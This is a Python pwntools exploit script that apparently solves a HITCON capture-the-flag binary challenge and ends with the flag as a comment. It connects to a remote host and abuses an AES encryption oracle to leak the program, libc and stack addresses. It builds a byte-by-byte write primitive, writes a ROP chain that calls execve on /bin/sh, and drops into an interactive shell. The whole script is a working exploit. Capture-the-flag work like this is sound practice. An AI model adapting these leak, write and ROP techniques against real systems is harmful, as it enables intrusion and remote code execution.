from __future__ import print_function
from pwn import *
from Crypto.Cipher import AES

s = remote('3.113.219.89', 31337)

# exe base (filled in later)
BASE = 0

data_start = 0x0202000
dso_handle = 0x0202008
bssaddr = 0x202358
aeskey = 0x202380
aesiv = 0x202390
buf = 0x2023A0

def sendenc(addr, size):
    assert size % 16 == 0

    offset = (addr - (BASE + buf)) & ((1<<64)-1)
    s.sendline(str(offset))
    if size > 0:
        # They add 16 to the size if it's already a multiple of 16
        s.sendline(str(size - 1))
    else:
        s.sendline('0')

def recvenc(size):
    s.recvuntil('size:')
    return s.recv(size)

def enc(addr, size):
    sendenc(addr, size)
    return recvenc(size)

def decrypt(key, iv, chunk):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(chunk)

def encrypt(key, iv, chunk):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(chunk)

key = enc(aeskey, 16)
iv = '\x00' * 16
leak1 = decrypt(key, iv, enc(data_start, 16))
BASE = u64(leak1[8:16]) - dso_handle
log.info("exe base: 0x%x", BASE)

# data shows us what's in the data segment past stdout
encstate = enc(BASE + bssaddr, 0x20) + "\x00" * 8 + key + iv + b'\x00' * 256
leak2 = decrypt(key, iv, encstate[:0x20])
libcbase = u64(leak2[8:16]) - 0x3ec680
log.info("libc base: 0x%x", libcbase)

leak3 = decrypt(key, iv, enc(libcbase + 0x3EE098, 0x10))
stackaddr = u64(leak3[:8])
log.info("environ: 0x%x", stackaddr)

# Randomly encrypt [i, offset]
enc(stackaddr - 0x120, 0x10)
# With 50% chance, we now have INFINITE WRITES. (The other 50% of the time, we exit immediately).

stack = enc(stackaddr - 0xf0, 0x100)
log.info("encstate dump: %s", encstate.encode('hex'))
log.info("stack dump: %s", decrypt(key, iv, stack).encode('hex'))

def write1(curdata, addr, ch):
    ''' Write a single byte to addr if the current data there is curdata.
    Return the new curdata. '''
    global encstate, key, iv

    keyoff = aeskey - bssaddr
    ivoff = aesiv - bssaddr
    while True:
        for offset in range(0, (ivoff + 1)):
            newstate = bytearray(encstate)
            newstate[offset:offset+0x80] = encrypt(key, iv, bytes(newstate[offset:offset+0x80]))
            newstate = bytes(newstate)
            newkey, newiv = newstate[keyoff:keyoff+16], newstate[ivoff:ivoff+16]
            if encrypt(newkey, newiv, bytes(curdata[:16]))[0] == ch:
                good = True
                break
        else:
            # Randomly re-encrypt the state and try again
            offset = 0
            good = False

        if good:
            log.info("ok: writing %r to 0x%x", ch, addr)
        else:
            log.info("retry state for 0x%x", addr)
        newstate = bytearray(encstate)
        sendenc(BASE + bssaddr + offset, 0x80)
        newstate[offset:offset+0x80] = encrypt(key, iv, bytes(newstate[offset:offset+0x80]))
        encstate = bytes(newstate)
        key, iv = encstate[keyoff:keyoff+16], encstate[ivoff:ivoff+16]
        if good:
            sendenc(addr, 0x10)
            return encrypt(key, iv, bytes(curdata[:16]))

stack = bytearray(stack)

### ROPCHAIN (from ropper)
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = libcbase # cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000021a45) # 0x0000000000021a45: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a0)
rop += rebase_0(0x0000000000064189) # 0x0000000000064189: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000021a45) # 0x0000000000021a45: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x0000000000064189) # 0x0000000000064189: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a0)
rop += rebase_0(0x0000000000023e6a) # 0x0000000000023e6a: pop rsi; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x0000000000001b96) # 0x0000000000001b96: pop rdx; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x00000000000439c8) # 0x00000000000439c8: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000d2975) # 0x00000000000d2975: syscall; ret; 
### ROPCHAIN

for i in range(len(rop)):
    stack[i:i+0x10] = write1(stack[i:i+0x10], stackaddr - 0xf0 + i, rop[i])

# Exit by rolling a large positive counter
sendenc(stackaddr - 0x120, 0x10)
sendenc(stackaddr - 0x120, 0x10)
sendenc(stackaddr - 0x120, 0x10)
sendenc(stackaddr - 0x120, 0x10)
s.clean(1)

s.interactive()

# hitcon{is_tH15_A_crypTO_cha11eng3_too00oo0oo???}
